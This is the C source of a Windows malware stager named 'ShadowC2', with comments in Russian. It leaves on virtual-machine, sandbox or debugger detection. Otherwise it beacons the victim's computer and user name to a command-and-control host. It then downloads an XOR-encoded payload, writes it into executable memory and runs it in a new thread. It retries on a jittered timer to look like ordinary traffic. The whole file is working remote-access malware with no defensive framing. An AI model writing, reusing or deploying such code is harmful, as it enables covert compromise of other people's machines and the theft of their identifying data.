#include "shadow.h"

// Простая XOR-шифровка для обфускации строк
VOID XorDecrypt(LPBYTE pData, DWORD dwDataSize, BYTE bKey) {
    for (DWORD i = 0; i < dwDataSize; i++) {
        pData[i] ^= bKey;
    }
}

// Генерация случайного jitter для имитации легитимного трафика
DWORD GetRandomJitter() {
    srand(GetTickCount());
    DWORD jitter = (BEACON_INTERVAL * JITTER_PERCENT) / 100;
    return rand() % jitter;
}

// Проверка на виртуальную среду
BOOL IsVM() {
    // Проверка через CPUID
    __try {
        __asm {
            mov eax, 0x40000000
            cpuid
            cmp ecx, 0x4D566572
            je vm_detected
            cmp ecx, 0x564D5868
            je vm_detected
            cmp ecx, 0x4D566572
            je vm_detected
            jmp no_vm
        vm_detected:
            mov eax, 1
            jmp end_check
        no_vm:
            mov eax, 0
        end_check:
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    
    // Дополнительные проверки
    if (GetModuleHandle(L"SbieDll.dll") != NULL) return TRUE;
    if (GetModuleHandle(L"VBoxHook.dll") != NULL) return TRUE;
    
    return FALSE;
}

// Проверка на песочницу
BOOL IsSandbox() {
    // Проверка времени выполнения
    DWORD startTime = GetTickCount();
    Sleep(2000);
    DWORD endTime = GetTickCount();
    
    if ((endTime - startTime) < 2000) {
        return TRUE; // Время ускорено в песочнице
    }
    
    // Проверка размера памяти
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    
    if (memInfo.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) { // Меньше 2GB RAM
        return TRUE;
    }
    
    return FALSE;
}

// Антианализ техники
VOID AntiAnalysis() {
    if (IsVM()) {
        DEBUG_PRINT("VM detected, exiting...\n");
        ExitProcess(0);
    }
    
    if (IsSandbox()) {
        DEBUG_PRINT("Sandbox detected, exiting...\n");
        ExitProcess(0);
    }
    
    // Проверка на отладчик
    if (IsDebuggerPresent()) {
        DEBUG_PRINT("Debugger detected, exiting...\n");
        ExitProcess(0);
    }
}

// Инициализация WinINet
BOOL InitializeWinINet(HINTERNET* hSession, HINTERNET* hConnect) {
    *hSession = InternetOpen(L"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!*hSession) return FALSE;
    
    *hConnect = InternetConnect(*hSession, C2_HOST, C2_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!*hConnect) {
        InternetCloseHandle(*hSession);
        return FALSE;
    }
    
    return TRUE;
}

// Отправка beacon-запроса
BOOL SendBeacon(HINTERNET hConnect, LPCWSTR pComputerName, LPCWSTR pUserName) {
    WCHAR wzHeaders[1024];
    wsprintf(wzHeaders, 
        L"Content-Type: application/json\r\n"
        L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
        L"X-Computer: %s\r\n"
        L"X-User: %s\r\n",
        pComputerName, pUserName);
    
    HINTERNET hRequest = HttpOpenRequest(hConnect, L"POST", C2_PATH, NULL, NULL, NULL, 
        INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    
    if (!hRequest) return FALSE;
    
    WCHAR wzData[512];
    wsprintf(wzData, L"{\"timestamp\":%d,\"status\":\"online\"}", GetTickCount());
    
    BOOL bResult = HttpSendRequest(hRequest, wzHeaders, wcslen(wzHeaders), (LPVOID)wzData, wcslen(wzData) * 2);
    
    InternetCloseHandle(hRequest);
    return bResult;
}

// Загрузка основного пейлоада
BOOL DownloadPayload(HINTERNET hConnect, LPBYTE* ppPayload, DWORD* pdwPayloadSize) {
    HINTERNET hRequest = HttpOpenRequest(hConnect, L"GET", L"/payload.bin", NULL, NULL, NULL,
        INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    
    if (!hRequest) return FALSE;
    
    if (!HttpSendRequest(hRequest, NULL, 0, NULL, 0)) {
        InternetCloseHandle(hRequest);
        return FALSE;
    }
    
    // Получаем размер данных
    DWORD dwContentLength = 0;
    DWORD dwBufferSize = sizeof(dwContentLength);
    HttpQueryInfo(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, 
        &dwContentLength, &dwBufferSize, NULL);
    
    if (dwContentLength == 0) {
        InternetCloseHandle(hRequest);
        return FALSE;
    }
    
    // Выделяем память
    *ppPayload = (LPBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwContentLength);
    if (!*ppPayload) {
        InternetCloseHandle(hRequest);
        return FALSE;
    }
    
    // Читаем данные
    DWORD dwBytesRead = 0;
    DWORD dwTotalRead = 0;
    
    while (InternetReadFile(hRequest, *ppPayload + dwTotalRead, 4096, &dwBytesRead) && dwBytesRead > 0) {
        dwTotalRead += dwBytesRead;
    }
    
    *pdwPayloadSize = dwTotalRead;
    InternetCloseHandle(hRequest);
    
    return (dwTotalRead > 0);
}

// Выполнение загруженного пейлоада
BOOL ExecutePayload(LPBYTE pPayload, DWORD dwPayloadSize) {
    // Расшифровываем пейлоад (XOR с ключем 0x42)
    XorDecrypt(pPayload, dwPayloadSize, 0x42);
    
    // Выделяем исполняемую память
    LPVOID pExecMem = VirtualAlloc(NULL, dwPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pExecMem) return FALSE;
    
    // Копируем пейлоад
    memcpy(pExecMem, pPayload, dwPayloadSize);
    
    // Создаем поток для выполнения
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExecMem, NULL, 0, NULL);
    if (!hThread) {
        VirtualFree(pExecMem, 0, MEM_RELEASE);
        return FALSE;
    }
    
    WaitForSingleObject(hThread, INFINITE);
    
    CloseHandle(hThread);
    VirtualFree(pExecMem, 0, MEM_RELEASE);
    
    return TRUE;
}

// Основная функция стейджера
VOID RunStager() {
    DEBUG_PRINT("ShadowC2 Stager started\n");
    
    // Антианализ проверки
    AntiAnalysis();
    
    // Получаем информацию о системе
    WCHAR wzComputerName[MAX_COMPUTERNAME_LENGTH + 1];
    WCHAR wzUserName[256];
    DWORD dwSize = MAX_COMPUTERNAME_LENGTH + 1;
    
    GetComputerName(wzComputerName, &dwSize);
    dwSize = 256;
    GetUserName(wzUserName, &dwSize);
    
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    
    // Основной цикл стейджера
    while (TRUE) {
        if (InitializeWinINet(&hSession, &hConnect)) {
            // Отправляем beacon
            SendBeacon(hConnect, wzComputerName, wzUserName);
            
            // Пытаемся загрузить пейлоад
            LPBYTE pPayload = NULL;
            DWORD dwPayloadSize = 0;
            
            if (DownloadPayload(hConnect, &pPayload, &dwPayloadSize)) {
                DEBUG_PRINT("Payload downloaded, size: %d bytes\n", dwPayloadSize);
                
                // Выполняем пейлоад
                ExecutePayload(pPayload, dwPayloadSize);
                
                // Освобождаем память
                HeapFree(GetProcessHeap(), 0, pPayload);
                
                // После выполнения пейлоада выходим
                break;
            }
            
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hSession);
        }
        
        // Ожидаем с jitter
        DWORD jitter = GetRandomJitter();
        DEBUG_PRINT("Sleeping for %d ms\n", BEACON_INTERVAL + jitter);
        Sleep(BEACON_INTERVAL + jitter);
    }
}

// Точка входа
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    RunStager();
    return 0;
}